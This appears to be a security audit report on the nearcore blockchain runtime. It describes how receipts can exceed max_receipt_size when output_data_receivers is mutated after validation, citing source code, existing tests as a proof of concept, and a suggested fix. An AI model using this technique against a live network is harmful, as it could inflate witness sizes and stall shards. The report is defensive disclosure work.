### Title
Receipt `max_receipt_size` Invariant Bypassed via Post-Validation `output_data_receivers` Mutation in `promise_return`/`promise_then` — (`runtime/runtime/src/receipt_manager.rs`, `runtime/runtime/src/verifier.rs`)

---

### Summary

The nearcore runtime validates new receipts against `max_receipt_size` (4 MiB) exactly once, at creation time. However, the `create_action_receipt` path in `receipt_manager.rs` subsequently appends `DataReceiver` entries to the `output_data_receivers` field of already-validated receipts when a contract calls `promise_then` or `promise_return`. This post-validation mutation can push the receipt's serialized size above `max_receipt_size` with no re-check, allowing oversized receipts to be stored in state and propagated across shards. The bug is acknowledged in the codebase itself (issue #12606) and a dedicated test confirms it is exploitable by an ordinary user-deployed contract.

---

### Finding Description

**Validation path** (`runtime/runtime/src/verifier.rs`, lines 533–541):

```rust
if mode == ValidateReceiptMode::NewReceipt {
    let receipt_size: u64 =
        borsh::object_length(receipt).unwrap().try_into().expect("...");
    if receipt_size > limit_config.max_receipt_size {
        return Err(ReceiptValidationError::ReceiptSizeExceeded { ... });
    }
}
```

The size check fires only when `mode == ValidateReceiptMode::NewReceipt`. [1](#0-0) 

**Post-validation mutation** (`runtime/runtime/src/receipt_manager.rs`, lines 118–123):

```rust
for (data_id, receipt_index) in input_data_ids.iter().zip(receipt_indices.into_iter()) {
    self.action_receipts
        .get_mut(receipt_index as usize)
        .ok_or(HostError::InvalidReceiptIndex { receipt_index })?
        .output_data_receivers
        .push(DataReceiver { data_id: *data_id, receiver_id: receiver_id.clone() });
}
```

`create_action_receipt` is called when a contract issues `promise_then`. It pushes a new `DataReceiver` into the `output_data_receivers` of an **already-validated** receipt (the one identified by `receipt_index`). Each `DataReceiver` is a `(CryptoHash, AccountId)` pair — 32 bytes plus the account ID length — so even a single appended receiver can push a receipt that was sized exactly at the limit over it. [2](#0-1) 

The same mutation occurs via `promise_return`: when a contract returns a receipt index, the runtime rewires the parent receipt's `output_data_receivers` onto the returned receipt, again after validation.

**Explicit acknowledgement in the codebase** (`runtime/runtime/src/verifier.rs`, lines 578–585):

```
/// 2) There is a bug which allows to create receipts that are above the size limit.
///    Runtime has to handle them gracefully until the receipt size limit bug is fixed.
///    See https://github.com/near/nearcore/issues/12606 for details.
ExistingReceipt,
```

The `ExistingReceipt` mode was introduced specifically to tolerate these oversized receipts in the existing state, confirming the bug is live and unresolved. [3](#0-2) 

**Confirmed by a dedicated integration test** (`test-loop-tests/src/tests/max_receipt_size.rs`, lines 124–208):

The test `test_max_receipt_size_promise_return` crafts a receipt sized exactly at `max_receipt_size`, calls `promise_return` to trigger the `output_data_receivers` append, and then calls `assert_oversized_receipt_occurred` to **verify the oversized receipt actually appears in the chain**. The comment reads: *"The receipt should be rejected, but currently isn't because of a bug."* [4](#0-3) 

The same pattern is confirmed for value returns in `test_max_receipt_size_value_return` (lines 210–267). [5](#0-4) 

---

### Impact Explanation

An ordinary user can deploy a contract that:
1. Creates a new action receipt sized exactly at `max_receipt_size` (4,194,304 bytes) — e.g., by attaching a large `args` payload to a `promise_create` call.
2. Chains a `promise_then` or issues a `promise_return` on that receipt.

The runtime appends one or more `DataReceiver` entries to `output_data_receivers` of the already-validated receipt, pushing its serialized Borsh size above 4 MiB. The receipt is then stored in the trie and forwarded to the destination shard without re-validation.

Consequences:
- **Contract execution flow breakage**: The `max_receipt_size` invariant — which exists to bound `ChunkStateWitness` size — is silently violated. Chunk state witnesses can exceed their intended size budget.
- **Non-network-level DoS**: If the oversized receipt causes a `ChunkStateWitness` to exceed the combined size limits that chunk validators enforce, validators may produce a divergent chunk application result, stalling finality for the affected shard. This is fixable without a hardfork (by adding a post-mutation size re-check).
- The `ExistingReceipt` tolerance mode means the runtime does not crash, but the invariant is still broken and the oversized receipt propagates.

---

### Likelihood Explanation

- **Trigger**: Any user who can deploy a contract (standard NEAR account with sufficient balance) can trigger this. No privileged role is required.
- **Craft difficulty**: Low — the attacker only needs to know `max_receipt_size` (a public protocol parameter, 4,194,304 bytes) and the base receipt overhead, both of which are computable from public sources. The test itself computes `args_size = max_receipt_size - base_receipt_size` to demonstrate this.
- **Existing guard**: None. The `ExistingReceipt` mode explicitly skips the size check for receipts already in state, and there is no post-mutation re-validation anywhere in the receipt creation pipeline.

---

### Recommendation

After `create_action_receipt` appends to `output_data_receivers` of an existing receipt, re-compute the receipt's serialized size and return an error if it exceeds `limit_config.max_receipt_size`. Concretely, in `receipt_manager.rs` after the `output_data_receivers.push(...)` call, add:

```rust
let updated_size = borsh::object_length(&receipt).unwrap() as u64;
if updated_size > limit_config.max_receipt_size {
    return Err(HostError::NewReceiptValidationError(
        ReceiptValidationError::ReceiptSizeExceeded {
            size: updated_size,
            limit: limit_config.max_receipt_size,
        }
    ).into());
}
```

The same guard should be applied in the `promise_return` rewiring path. Once the fix is deployed, the `ExistingReceipt` tolerance mode can be tightened in a subsequent protocol upgrade.

---

### Proof of Concept

The existing test `test_max_receipt_size_promise_return` in `test-loop-tests/src/tests/max_receipt_size.rs` is a complete, runnable proof of concept: [6](#0-5) 

1. Deploy `near_test_contracts::rs_contract()`.
2. Call `max_receipt_size_promise_return_method1` with `args_size = max_receipt_size - base_receipt_size`.
3. The contract creates receipt C at exactly `max_receipt_size`, then calls `promise_return(C)`.
4. The runtime appends a `DataReceiver` to C's `output_data_receivers`, pushing it above the limit.
5. `assert_oversized_receipt_occurred` confirms the oversized receipt is present in the chain.

### Citations

**File:** runtime/runtime/src/verifier.rs (L533-541)
```rust
    if mode == ValidateReceiptMode::NewReceipt {
        let receipt_size: u64 =
            borsh::object_length(receipt).unwrap().try_into().expect("Can't convert usize to u64");
        if receipt_size > limit_config.max_receipt_size {
            return Err(ReceiptValidationError::ReceiptSizeExceeded {
                size: receipt_size,
                limit: limit_config.max_receipt_size,
            });
        }
```

**File:** runtime/runtime/src/verifier.rs (L578-585)
```rust
    /// Used for validating older receipts that were saved in the state/received. Less strict than
    /// NewReceipt validation. Tolerates some receipts that wouldn't pass new validation. It has to
    /// be less strict because:
    /// 1) Older receipts might have been created before new validation rules.
    /// 2) There is a bug which allows to create receipts that are above the size limit. Runtime has
    ///    to handle them gracefully until the receipt size limit bug is fixed.
    ///    See https://github.com/near/nearcore/issues/12606 for details.
    ExistingReceipt,
```

**File:** runtime/runtime/src/receipt_manager.rs (L118-124)
```rust
        for (data_id, receipt_index) in input_data_ids.iter().zip(receipt_indices.into_iter()) {
            self.action_receipts
                .get_mut(receipt_index as usize)
                .ok_or(HostError::InvalidReceiptIndex { receipt_index })?
                .output_data_receivers
                .push(DataReceiver { data_id: *data_id, receiver_id: receiver_id.clone() });
        }
```

**File:** test-loop-tests/src/tests/max_receipt_size.rs (L124-128)
```rust
// A function call will generate a new receipt. Size of this receipt will be equal to
// `max_receipt_size`, it'll pass validation, but then `output_data_receivers` will be modified and
// the receipt's size will go above max_receipt_size. The receipt should be rejected, but currently
// isn't because of a bug (See https://github.com/near/nearcore/issues/12606)
// Runtime shouldn't die when it encounters a receipt with size above `max_receipt_size`.
```

**File:** test-loop-tests/src/tests/max_receipt_size.rs (L129-208)
```rust
#[test]
fn test_max_receipt_size_promise_return() {
    init_test_logger();

    let account = create_account_id("account0");
    let account_signer = create_user_test_signer(&account);
    let mut env = TestLoopBuilder::new()
        .enable_rpc()
        .add_user_account(&account, Balance::from_near(10_000))
        .build();

    // Deploy the test contract
    let deploy_contract_tx = SignedTransaction::deploy_contract(
        101,
        &account,
        near_test_contracts::rs_contract().into(),
        &account_signer,
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(deploy_contract_tx, Duration::seconds(5));

    // User calls a contract method
    // Contract method creates a DAG with two promises: [A -then-> B]
    // When promise A is executed, it creates a third promise - `C` and does a `promise_return`.
    // The DAG changes to: [C ->then-> B]
    // The receipt for promise C is a maximum size receipt.
    // Adding the `output_data_receivers` to C's receipt makes it go over the size limit.
    let base_receipt_template = Receipt::V0(ReceiptV0 {
        predecessor_id: account.clone(),
        receiver_id: account.clone(),
        receipt_id: CryptoHash::default(),
        receipt: ReceiptEnum::Action(ActionReceipt {
            signer_id: account.clone(),
            signer_public_key: account_signer.public_key().into(),
            gas_price: Balance::ZERO,
            output_data_receivers: vec![],
            input_data_ids: vec![],
            actions: vec![Action::FunctionCall(Box::new(FunctionCallAction {
                method_name: "noop".into(),
                args: vec![],
                gas: Gas::ZERO,
                deposit: Balance::ZERO,
            }))],
        }),
    });
    let base_receipt_template = action_receipt_v1_to_latest(&base_receipt_template);
    let base_receipt_size = borsh::object_length(&base_receipt_template).unwrap();
    let max_receipt_size = 4_194_304;
    let args_size = max_receipt_size - base_receipt_size;

    // Call the contract
    let large_receipt_tx = SignedTransaction::call(
        102,
        account.clone(),
        account.clone(),
        &account_signer,
        Balance::ZERO,
        "max_receipt_size_promise_return_method1".into(),
        format!("{{\"args_size\": {}}}", args_size).into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(large_receipt_tx, Duration::seconds(5));

    // Make sure that the last promise in the DAG was called
    let assert_test_completed = SignedTransaction::call(
        103,
        account.clone(),
        account,
        &account_signer,
        Balance::ZERO,
        "assert_test_completed".into(),
        "".into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(assert_test_completed, Duration::seconds(5));

    assert_oversized_receipt_occurred(&env.validator());
}
```

**File:** test-loop-tests/src/tests/max_receipt_size.rs (L210-267)
```rust
/// Return a value that is as large as max_receipt_size. The value will be wrapped in a data receipt
/// and the data receipt will be bigger than max_receipt_size. The receipt should be rejected, but
/// currently isn't because of a bug (See https://github.com/near/nearcore/issues/12606)
/// Creates the following promise DAG:
/// A[self.return_large_value()] -then-> B[self.mark_test_completed()]
#[test]
fn test_max_receipt_size_value_return() {
    init_test_logger();

    let account = create_account_id("account0");
    let account_signer = create_user_test_signer(&account);
    let mut env = TestLoopBuilder::new()
        .enable_rpc()
        .add_user_account(&account, Balance::from_near(10_000))
        .build();

    // Deploy the test contract
    let deploy_contract_tx = SignedTransaction::deploy_contract(
        101,
        &account,
        near_test_contracts::rs_contract().into(),
        &account_signer,
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(deploy_contract_tx, Duration::seconds(5));

    let max_receipt_size = 4_194_304;

    // Call the contract
    let large_receipt_tx = SignedTransaction::call(
        102,
        account.clone(),
        account.clone(),
        &account_signer,
        Balance::ZERO,
        "max_receipt_size_value_return_method".into(),
        format!("{{\"value_size\": {}}}", max_receipt_size).into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(large_receipt_tx, Duration::seconds(5));

    // Make sure that the last promise in the DAG was called
    let assert_test_completed = SignedTransaction::call(
        103,
        account.clone(),
        account,
        &account_signer,
        Balance::ZERO,
        "assert_test_completed".into(),
        "".into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(assert_test_completed, Duration::seconds(5));

    assert_oversized_receipt_occurred(&env.validator());
}
```
